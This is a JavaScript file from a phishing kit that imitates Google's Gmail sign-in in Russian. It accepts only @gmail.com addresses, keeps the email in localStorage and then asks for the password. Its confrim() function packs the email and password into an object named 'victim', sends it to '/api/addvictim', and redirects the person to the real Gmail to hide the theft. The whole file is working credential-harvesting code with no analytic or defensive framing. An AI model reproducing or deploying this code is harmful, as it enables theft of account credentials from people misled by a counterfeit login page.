// $(".toggle-password").click(function() {
//
//     $(this).toggleClass("fa-eye fa-eye-slash");
//     var input = $($(this).attr("toggle"));
//     if (input.attr("type") === "password") {
//         input.attr("type", "text");
//     } else {
//         input.attr("type", "password");
//     }
// });



function gotoPassword() {
    let email=document.getElementById("email").value;
    if (!email.endsWith("@gmail.com")||email===''){
        document.getElementById("email").style.borderColor="red";
        document.getElementById("email").style.color="red";
        document.getElementById("email").setCustomValidity("!Введите адрес электронной почты или номер телефона.")
        document.getElementById('error1').style.display='block';
    }
    else {
        localStorage.setItem('email', email);
        document.getElementById('error1').style.display='none';
        document.getElementById("email").style.borderColor="gray";
        document.getElementById("email").style.color="gray";
        document.getElementById("email").setCustomValidity("")
        // document.getElementById('root').innerHTML="<div style=\"width: 33%!important; height: 70%!important; border: 2px solid rgba(175,175,175,0.5);!important; border-radius: 15px!important;\" class=\"row mt-5 w-100 mb-5 text-center d-flex justify-content-center\">\n" +
        //     "            <img th:src='@{/images/gog.jpg}' height=\"49\" width=\"101\" class=\"mt-4 text-center d-flex justify-content-center\" src=\"../static/images/gog.jpg\" style=\"\">\n" +
        //     "            <h3 class=\"col-12 mt-3\">Добро пожаловать!</h3>\n" +
        //     "            <h6 class=\"border pt-1 pb-1 pl-2 pr-2 mb-5\" style=\"cursor: pointer; border-radius: 20px!important;\">"+email+"</h6>\n" +
        //     "\n" +
        //     "\n" +
        //     "            <div class=\"col-10 container1\">\n" +
        //     "                <input onkeyup='success()' type=\"password\" name=\"password\" id=\"password\" style=\"height: 50px!important;\" class=\"form-control\" placeholder=\"Телефон или address эл почты\">\n" +
        //     "                <i class=\"far fa-eye field-icon\" id=\"togglePassword\"></i>\n" +
        //     "            </div>\n" +
        //     "\n" +
        //     "\n" +
        //     "           <div class=\"col-10 mt-4 mb-4\">\n" +
        //     "                <a style=\"margin-bottom: 45%!important;\" href=\"/\" type=\"button\" class=\"btn float-left\">Забыли пароль</a>\n" +
        //     "                <button disabled id='button' style=\"color: white; margin-bottom: 45%!important;\" href=\"/\" type=\"button\" class=\"btn btn-primary float-right\">Далее</button>\n" +
        //     "            </div>\n" +
        //     "        </div>"
        window.location='/pass';
    }
}




// function password() {
//     let password=document.getElementById('password').value;
//     if ()
// }

function success() {
    document.getElementById('button').disabled = document.getElementById("password").value === "";
}
function confrim() {
    let password=document.getElementById('password').value;
    // localStorage.setItem('password',password);
    let victim={
        'email':localStorage.getItem('email'),
        'password':password
    }

    axios.post("/api/addvictim", {email:victim.email, password:victim.password})
        .then(function (response) {
            console.log(response);
        })

    window.location="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwio-rXj3PjsAhUMmYsKHfyLBUIQFjAAegQIARAD&url=https%3A%2F%2Fwww.google.com%2Fgmail%2F&usg=AOvVaw3mZ_qbD_gQyp_sqkjrwStn"
}







function InvalidMsg(textbox) {
    if (textbox.value === '') {
        // alert("aaaaaaaaaa");
        textbox.setCustomValidity('!Введите адрес электронной почты или номер телефона.');
    }


    else{


        switch (textbox.id) {



            case 'email':
                let email=document.getElementById("email").value;
                if (!email.endsWith("@gmail.com")){
                    document.getElementById("email").style.borderColor="red";
                    document.getElementById("email").style.color="red";
                    document.getElementById("email").setCustomValidity("!Введите адрес электронной почты или номер телефона.")
                }
                break;
















            default:
                textbox.setCustomValidity('');
                break;
        }


    }

    // return true;

}